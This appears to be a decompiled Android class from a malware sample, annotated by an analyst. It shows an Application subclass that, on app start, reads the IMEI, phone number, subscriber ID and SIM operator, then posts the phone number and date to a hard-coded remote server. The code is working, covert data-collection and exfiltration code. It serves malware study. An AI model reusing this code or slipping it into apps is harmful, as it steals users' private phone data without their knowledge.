package com.scott.crash;

import android.app.Application;
import android.telephony.TelephonyManager;
import android.util.Log;
import cn.smsmanager.internet.ScanNetWorkSateTask;
import cn.smsmanager.tools.ParamsInfo;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.Thread;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

/* loaded from: classes.dex */
public final class CrashApplication extends Application {

    static List<NameValuePair> params;
    Thread jianshiThread;
    Thread thread;
    String insert_url = "http://kkk.kakatt.net:3369/send_sim_no.php"; // [fmss] remote url
    String TAG = "CrashApplication";
    TelephonyManager telManager = null;
    Thread.State threadLastState = Thread.State.NEW;
    long startTime = System.currentTimeMillis();
    long endTime = System.currentTimeMillis();
    boolean isDoing = false;
    Timer timer = new Timer();

    // [fmss] timer task that start ScanNetWorkSateTask
    // however, it isn't scheduled by application (apparently)
    TimerTask ttTask = new TimerTask() { // from class: com.scott.crash.CrashApplication.1
        @Override // java.util.TimerTask, java.lang.Runnable
        public void run() {
            if (!CrashApplication.this.isDoing) {
                CrashApplication.this.isDoing = true;
                new ScanNetWorkSateTask().run();
                CrashApplication.this.isDoing = false;
            }
        }
    };

    // [fmss] get phone number
    public String getPhoneNumber() {
        TelephonyManager tm = (TelephonyManager) getSystemService("phone");
        String imei = tm.getDeviceId();
        String tel = tm.getLine1Number();
        String[] strArr = {imei, tel};
        Log.d(this.TAG, imei);
        Log.d(this.TAG, tel);
        return tel;
    }

    /* JADX WARN: Type inference failed for: r7v15, types: [com.scott.crash.CrashApplication$2] */
    @Override // android.app.Application
    // [fmss] create the crash application
    public void onCreate() {
        super.onCreate();
        Log.i("JIANSHI", "application create");

        // [fmss] init crash handler
        CrashHandler crashHandler = CrashHandler.getInstance();
        crashHandler.init(getApplicationContext());

        // [fmss] get sensitive information from smartphon (phone number, subscriber id, sim operator)
        // Log the information and save them for later.
        this.telManager = (TelephonyManager) getSystemService("phone");
        ParamsInfo.isServiceStart = true;
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
        String sim_no = this.telManager.getSubscriberId();
        String getLine1Number = getPhoneNumber();
        Log.d(this.TAG, getLine1Number);
        Log.d(this.TAG, sim_no);
        Log.d(this.TAG, this.telManager.getSimOperatorName());
        ParamsInfo.Line1Number = getLine1Number;
        ParamsInfo.sim_no = sim_no;

        // [fmss] init params to send to remote url
        params = new ArrayList();
        params.add(new BasicNameValuePair("mobile_no", getLine1Number));
        Date currentTime = new Date();
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
        String dateString = formatter.format(currentTime);
        params.add(new BasicNameValuePair("datetime", dateString));


        new Thread() { // from class: com.scott.crash.CrashApplication.2
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
                // [fmss] send information (phone number and current timestamp) to remote url
                HttpPost httppost = new HttpPost(CrashApplication.this.insert_url);
                try {
                    httppost.setEntity(new UrlEncodedFormEntity(CrashApplication.params, "EUC-KR"));
                    Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params));", "gone");
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                try {
                    HttpResponse response = defaultHttpClient.execute(httppost);
                    Log.d("response=httpclient.execute(httppost);", response.toString());
                } catch (IOException e2) {
                    e2.printStackTrace();
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                }
            }
        }.start();
    }
}
